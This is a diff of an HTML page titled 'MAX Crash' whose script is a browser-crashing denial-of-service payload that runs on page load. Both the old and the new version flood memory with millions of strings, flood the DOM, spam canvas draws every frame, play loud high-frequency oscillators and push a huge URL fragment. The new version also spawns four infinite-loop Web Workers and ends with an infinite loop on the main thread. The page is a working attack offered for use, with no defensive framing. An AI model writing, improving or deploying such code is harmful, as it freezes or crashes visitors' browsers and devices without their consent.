@@ -1,72 +1,90 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>💥 Instant Crash Test</title>
+  <title>💥 MAX Crash</title>
   <style>
-    * { margin: 0; padding: 0; }
-    html, body {
-      width: 100%; height: 100%;
-      background: black; color: lime;
+    body {
+      background: black;
+      color: lime;
       font-family: monospace;
+      margin: 0;
       overflow: hidden;
     }
   </style>
 </head>
 <body>
-  <h1>☠️ Instant Crash Triggered</h1>
+  <h1>🚨 MAXIMUM BROWSER OVERLOAD 🚨</h1>
+  <canvas id="c"></canvas>
   <script>
-    // 1. 💥 Max RAM Flood: Allocate huge arrays fast
-    let ramArray = [];
-    for (let i = 0; i < 1e7; i++) {
-      ramArray.push("💣".repeat(1000)); // ~1KB per item
+    // ⚠️ 1. Massive RAM allocation
+    let hugeArray = [];
+    try {
+      for (let i = 0; i < 1e7; i++) {
+        hugeArray.push("💥".repeat(1024)); // 1 KB per item
+      }
+    } catch (e) {
+      console.warn("RAM allocation failed:", e);
     }
 
-    // 2. ⚙️ Max CPU Burn: Infinite math storm (spawns multiple threads if allowed)
-    for (let i = 0; i < 4; i++) {
-      setTimeout(() => {
-        while (true) {
-          Math.pow(Math.random(), Math.random()) * Date.now();
-        }
-      }, 0);
+    // ⚠️ 2. Infinite CPU loop on main thread
+    function burnCPU() {
+      while (true) {
+        let x = Math.pow(Math.random(), Math.random()) * Date.now();
+      }
     }
 
-    // 3. 🎨 GPU Abuse: Max canvas spam immediately
-    const canvas = document.createElement("canvas");
+    // ⚠️ 3. DOM flooding with nested elements
+    const container = document.createElement("div");
+    document.body.appendChild(container);
+    for (let i = 0; i < 10000; i++) {
+      const d = document.createElement("div");
+      d.innerHTML = `<span>${"🔥".repeat(500)}</span>`;
+      container.appendChild(d);
+    }
+
+    // ⚠️ 4. Canvas GPU spam (fill full screen with thousands of colored rects)
+    const canvas = document.getElementById("c");
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    document.body.appendChild(canvas);
     const ctx = canvas.getContext("2d");
-    function spamGPU() {
-      for (let i = 0; i < 20000; i++) {
-        ctx.fillStyle = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
-        ctx.fillRect(Math.random()*canvas.width, Math.random()*canvas.height, 2, 2);
-      }
-      requestAnimationFrame(spamGPU);
-    }
-    spamGPU();
 
-    // 4. 🔊 Audio Thread Storm: Multiple oscillators nonstop
+    function drawGPU() {
+      for (let i = 0; i < 50000; i++) {
+        ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
+        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 3, 3);
+      }
+      requestAnimationFrame(drawGPU);
+    }
+    drawGPU();
+
+    // ⚠️ 5. Audio overload
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    for (let i = 0; i < 5; i++) {
+    for (let i = 0; i < 4; i++) {
       const osc = audioCtx.createOscillator();
       osc.type = "square";
-      osc.frequency.setValueAtTime(16000 + Math.random()*3000, audioCtx.currentTime);
+      osc.frequency.setValueAtTime(18000 + Math.random()*1000, audioCtx.currentTime);
       osc.connect(audioCtx.destination);
       osc.start();
       osc.stop(audioCtx.currentTime + 0.5);
     }
 
-    // 5. 🧬 DOM Injection Bomb: Inject 1000s of nodes in milliseconds
-    const container = document.createElement("div");
-    document.body.appendChild(container);
-    for (let i = 0; i < 1e5; i++) {
-      const d = document.createElement("div");
-      d.textContent = "🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥";
-      container.appendChild(d);
+    // ⚠️ 6. URL fragment bomb
+    history.pushState({}, "", "#" + "X".repeat(50000));
+
+    // ⚠️ 7. Web Worker CPU bomb (if supported)
+    const workerCode = `
+      while (true) {
+        Math.sqrt(Math.random() * Date.now());
+      }
+    `;
+    const blob = new Blob([workerCode], { type: 'application/javascript' });
+    const url = URL.createObjectURL(blob);
+    for (let i = 0; i < 4; i++) {
+      new Worker(url);
     }
 
-    // 6. 🌪️ URL Fragment Lag (some mobile browsers die on this)
-    history.pushState({}, "", "#" + "X".repeat(100000));
+    // ⚠️ 8. CPU loop (trigger last)
+    setTimeout(burnCPU, 1);
 
   </script>
 </body>
